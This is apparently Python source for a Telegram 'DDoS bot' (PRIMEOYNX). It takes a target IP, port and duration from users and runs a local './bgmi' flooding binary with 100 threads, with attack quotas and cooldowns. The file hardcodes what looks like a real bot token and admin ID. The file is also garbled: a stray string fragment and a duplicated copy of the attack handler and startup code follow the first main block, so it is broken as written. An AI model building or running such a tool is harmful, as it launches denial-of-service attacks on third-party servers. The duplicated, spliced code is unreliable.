import os
import telebot
import subprocess
import threading
import time
from datetime import datetime, timedelta
from flask import Flask

# ========== CONFIGURATION ==========
TOKEN = "8754814217:AAGUSLQbKATrq0dxn-SYGq81pSL10xROSYY"
ADMIN_IDS = [8318925500]

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# Global variables
user_attacks = {}
user_cooldowns = {}
active_attacks = 0
attack_lock = threading.Lock()

# Railway/Free Server Optimized Config
thread_count = 100 
COOLDOWN_DURATION = 30
DAILY_ATTACK_LIMIT = 50
MAX_ACTIVE_ATTACKS = 3
EXEMPTED_USERS = [8318925500]

def is_valid_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(part.isdigit() and 0 <= int(part) <= 255 for part in parts)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    username = message.from_user.username or message.from_user.first_name
    bot.reply_to(message, f"🚀 *PRIMEOYNX DDOS BOT* 🚀\n\n✅ *Welcome @{username}!*\n\n📌 *Commands:*\n▪️ `/bgmi <IP> <PORT> <TIME>`\n▪️ `/status`", parse_mode="Markdown")

@bot.message_handler(commands=['status'])
def check_status(message):
    user_id = message.from_user.id
    remaining = DAILY_ATTACK_LIMIT - user_attacks.get(user_id, 0)
    bot.reply_to(message, f"📊 *Status*\n🎯 *Remaining:* `{remaining}/{DAILY_ATTACK_LIMIT}`\n⚡ *Active:* `{active_attacks}/{MAX_ACTIVE_ATTACKS}`", parse_mode="Markdown")

@bot.message_handler(commands=['bgmi'])
def bgmi_command(message):
    global active_attacks
    user_id = message.from_user.id
    
    if active_attacks >= MAX_ACTIVE_ATTACKS:
        bot.reply_to(message, "⏳ *Server Busy!* Sabhi slots full hain.")
        return
    
    if user_id in user_cooldowns and datetime.now() < user_cooldowns[user_id]:
        remaining = int((user_cooldowns[user_id] - datetime.now()).seconds)
        bot.reply_to(message, f"⏰ *Cooldown: {remaining}s*")
        return

    try:
        args = message.text.split()[1:]
        if len(args) != 3:
            bot.reply_to(message, "📌 *Usage:* `/bgmi <IP> <PORT> <TIME>`")
            return

        ip, port, time_val = args
        duration = int(time_val)
        
        if duration > 180:
            bot.reply_to(message, "❌ *Max time 180s allowed!*")
            return

        if user_id not in EXEMPTED_USERS:
            user_attacks[user_id] = user_attacks.get(user_id, 0) + 1
            user_cooldowns[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)
        
        with attack_lock:
            active_attacks += 1
        
        bot.reply_to(message, f"🚀 *ATTACK SENT!* 🚀\n🎯 `{ip}:{port}` for `{duration}s`", parse_mode="Markdown")
        
        def run_attack():
            global active_attacks
            try:
                if not os.path.exists("./bgmi"):
                    bot.send_message(message.chat.id, "❌ *Error:* Binary not found!")
                    return
                
                cmd = ["./bgmi", ip, str(port), str(duration), str(thread_count)]
                process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                time.sleep(duration)
                process.terminate()
                
                bot.send_message(message.chat.id, f"✅ *Finished:* `{ip}:{port}`", parse_mode="Markdown")
            except Exception as e:
                bot.send_message(message.chat.id, f"❌ *Failed:* {str(e)}")
            finally:
                with attack_lock:
                    active_attacks = max(0, active_attacks - 1)
        
        threading.Thread(target=run_attack, daemon=True).start()
        
    except Exception as e:
        bot.reply_to(message, f"❌ *Error:* {str(e)}")

@app.route('/')
def home():
    return "PRIMEOYNX Bot is running!"

if __name__ == "__main__":
    print("=" * 40)
    print("🚀 PRIMEOYNX DDOS BOT STARTING...")
    print(f"👑 Admin ID: {ADMIN_IDS[0]}")
    print("=" * 40)
    
    bot.remove_webhook()
    
    port = int(os.environ.get("PORT", 8080))
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=port), daemon=True).start()
    
    bot.infinity_polling()
   # Flask for Railway port binding
    port = int(os.environ.get("PORT", 8080))
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=port), daemon=True).start()
    
    bot.remove_webhook()
    bot.infinity_polling()
, f"""
🚀 *ATTACK STARTED!* 🚀

🎯 *Target:* `{ip}:{port}`
⏱️ *Duration:* `{duration}s`
🎯 *Remaining:* `{remaining}/{DAILY_ATTACK_LIMIT}`

💀 *PRIMEOYNX ACTIVE*
""", parse_mode="Markdown")
        
        def run_attack():
            global active_attacks
            try:
                # Binary name is './bgmi' as per your Docker/Nixpacks config
                if not os.path.exists("./bgmi"):
                    bot.send_message(message.chat.id, "❌ *Binary not found!*", parse_mode="Markdown")
                    return
                
                # Command structure for your C code
                cmd = ["./bgmi", ip, str(port), str(duration), str(thread_count)]
                subprocess.run(cmd, timeout=duration+5)
                
                bot.send_message(message.chat.id, f"✅ *Attack finished on {ip}:{port}*", parse_mode="Markdown")
                
            except Exception as e:
                bot.send_message(message.chat.id, f"❌ *Attack failed: {str(e)}*", parse_mode="Markdown")
            finally:
                with attack_lock:
                    active_attacks = max(0, active_attacks - 1)
        
        threading.Thread(target=run_attack, daemon=True).start()
        
    except Exception as e:
        bot.reply_to(message, f"❌ *Error: {str(e)}*", parse_mode="Markdown")
        with attack_lock:
            active_attacks = max(0, active_attacks - 1)

# ========== WEB SERVER (For Railway) ==========
@app.route('/')
def home():
    return "PRIMEOYNX Bot is running!"

if __name__ == "__main__":
    print("=" * 40)
    print("🚀 PRIMEOYNX DDOS BOT STARTING...")
    print(f"👑 Admin ID: {ADMIN_IDS[0]}")
    print("=" * 40)
    
    # Polling mode is simpler for initial setup on Railway
    bot.remove_webhook()
    
    # Start Flask in a separate thread
    port = int(os.environ.get("PORT", 8080))
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=port), daemon=True).start()
    
    # Start Bot Polling
    bot.infinity_polling()
